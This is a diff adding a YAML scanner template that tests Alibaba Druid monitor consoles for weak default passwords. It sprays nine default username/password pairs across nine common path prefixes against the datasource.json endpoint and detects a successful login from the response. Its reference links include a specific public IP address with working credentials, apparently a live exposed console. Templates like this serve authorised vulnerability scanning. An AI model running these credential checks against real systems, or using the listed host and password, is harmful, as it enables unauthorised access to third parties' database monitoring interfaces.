@@ -1,0 +1,34 @@
+name: poc-yaml-druid-monitor-weakpass
+sets:
+  weakpass:
+    - loginUsername=admin&loginPassword=admin
+    - loginUsername=ry&loginPassword=123456
+    - loginUsername=admin&loginPassword=123456
+    - loginUsername=ruoyi&loginPassword=admin123
+    - loginUsername=dy&loginPassword=123456
+    - loginUsername=ruoyi&loginPassword=123456
+    - loginUsername=dy&loginPassword=admin123
+    - loginUsername=druid&loginPassword=druid
+    - loginUsername=admin&loginPassword=admin123
+  uri:
+    - /
+    - /api/
+    - /admin/
+    - /admin-api/
+    - /prod-api/
+    - /jeecg-boot/
+    - /dev-api/
+    - /system/
+    - /webpage/system/
+rules:
+  - method: POST
+    # path: /druid/datasource.json
+    path: "{{uri}}druid/datasource.json"
+    body: "{{weakpass}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"FilterClassNames") && response.body.bcontains(b"com.alibaba.druid")
+detail:
+  author: rootmog
+  links:
+    - https://github.com/alibaba/druid
+    - http://39.108.94.156:8086/druid/index.html(admin/123456)\
